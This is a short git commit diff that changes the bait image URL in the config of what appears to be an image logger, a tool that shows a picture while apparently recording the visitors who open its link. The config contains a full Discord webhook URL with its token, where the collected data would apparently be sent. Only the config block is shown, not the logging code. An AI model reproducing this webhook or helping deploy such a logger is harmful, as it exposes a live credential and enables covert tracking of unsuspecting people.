49afbb8c6283612d533d1c83cd69b224042cc2fd
DELPY-WEB <djustinvanderlinden552@gmail.com>
2025-05-09 12:29:54 +0200

    image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1370336143739981845/Ko7uB_q_6CYoH_XzZ1acHhHbcMkHwg8GnaHADgJGEJeX2MeiZS7RfZ3Nq_I3of5KEAk4",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://www.sleek-mag.com/wp-content/uploads/2023/09/Photo-by-Charles-ORear_extendend-1024x640.jpg?v=1695037844", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
